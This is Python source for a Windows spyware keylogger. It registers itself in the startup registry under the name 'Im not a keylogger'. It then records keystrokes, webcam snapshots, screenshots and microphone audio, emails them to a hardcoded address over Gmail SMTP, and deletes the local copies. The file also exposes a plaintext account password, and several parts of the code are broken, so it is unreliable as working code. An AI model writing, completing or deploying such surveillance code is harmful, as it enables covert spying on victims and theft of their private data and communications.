#!/usr/bin/env python
from email.mime.multipart import MIMEMultipart
from pynput.keyboard import Key, Listener
from time import strftime, sleep, time
from threading import Semaphore, Timer
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
import pyscreenshot as ImageGrab
from email import encoders
#from PIL import ImageGrab
from sys import byteorder
from array import array
from _winreg import *
import multiprocessing
import subprocess
import keyboard
import requests
import smtplib
import pyaudio
import base64
import errno
import wave
import sys
import cv2
import os


CHUNK = 1024
FORMAT = pyaudio.paInt16
RATE = 44100
RECORD_SECONDS = 300
SEND_REPORT_EVERY = 600 
WAVE_OUTPUT_FILENAME = "wof.wav"
DATA_DIR = os.path.join(os.getenv('APPDATA'), 'ffSysData\\')
FILE_INDEX = 0
frames = []
keys = []

time_start = time()

#Creation Exception for already existiny folder
try:
    os.makedirs(DATA_DIR)
except OSError as e:
    if e.errno != errno.EEXIST:
        raise

        
def addStartup():  # this will add the file to the startup registry key
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split('\\')[-1]
    new_file_path = fp + '\\' + file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(key2change, 'Im not a keylogger', 0, REG_SZ,
               new_file_path)

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        # for blocking after setting the on_release listener
        self.semaphore = Semaphore(0)
    def is_connected():
        try:
            socket.create_connection(('www.google.com', 80))
            return True
        except OSError:
            pass
            return False
    def GetMedia():
        start1=time()
        while True:
            #For Camera View
            final1=time()
            cam = cv2.VideoCapture(0)
            ret, frame = cam.read()
            IMG_CAM_FILENAME =  "ICF" + str(int((final1-start1)%10)) + ".png"
            cv2.imwrite(DATA_DIR+IMG_CAM_FILENAME, frame)
            cam.release()
            cv2.destroyAllWindows()
            #Get Screenshot
            im = ImageGrab.grab()
            fname = "sshot.png"
            IMG_SS_FILENAME = "ss" + str(int(((final1-start1)/2)%10)) + ".png"
            im.save(DATA_DIR+IMG_SS_FILENAME, 'png')
            sleep(120)
    def getAudio():
        while True:
            p = pyaudio.PyAudio()
            stream = p.open(format=FORMAT,
                channels=2,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)
            #Recording audio
            for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                data = stream.read(CHUNK)
                frames.append(data)
            stream.stop_stream()
            stream.close()
            p.terminate()
            wf = wave.open(DATA_DIR+WAVE_OUTPUT_FILENAME, 'wb')
            wf.setnchannels(2)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            sleep(330)
    def send_email(logs):
        dir_path = DATA_DIR
        fromaddr = "yadavavinash591@gmail.com"
        toaddr = "annymumer@gmail.com"
        pas = "Awsm@123"
        files = dir_path.listdir()
        msg = MIMEMultipart()
        msg['To'] = toaddr
        msg['From'] = fromaddr
        msg['Subject'] = "Here are the files you need"
        body = MIMEText(logs, 'plain')  
        msg.attach(body)  
        for f in files:  # add files to the message
            file_path = os.path.join(dir_path, f) #Get file location
            attachment = MIMEApplication(open(file_path, "rb").read())
            attachment.add_header('Content-Disposition','attachment', filename=f)
            msg.attach(attachment) #add attachment
            os.remove(file_path) #Delete the file)
        s=smtplib.SMTP('smtp.gmail.com', 587) #Starting connection
        s.starttls() #increase Security
        s.login(fromaddr, pas) #Logging In
        s.sendmail(fromaddr, toaddr, msg.as_string()) #sending mail
        s.quit()
        self.log=""
        strike()
    def strokes(name):
        while True:    
            if len(name) > 1:
                if name == "space":
                    name = " "
                elif name == "enter":
                    name = "[ENTER]\n"
                elif name == "decimal":
                    name = "."
                else:
                  #name = name.replace(" ", "_")
                  name = f"[{name.upper()}]"        
            self.log += name
    def strike(self):
        with Listener(on_press=strokes, on_release=None) as lis:
            time.sleep(self.interval)
            lis.stop()
            send_email(self.log)
            lis.join()
    def start(self):
        p2 = multiprocessing.Process(name='p2', target=getAudio)
        p1 = multiprocessing.Process(name='p1', target=strike)
        p = multiprocessing.Process(name='p', target=getMedia)
        p1.start()
        p.start()
        p2.start()


if __name__ == "__main__":
    addStartup()
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
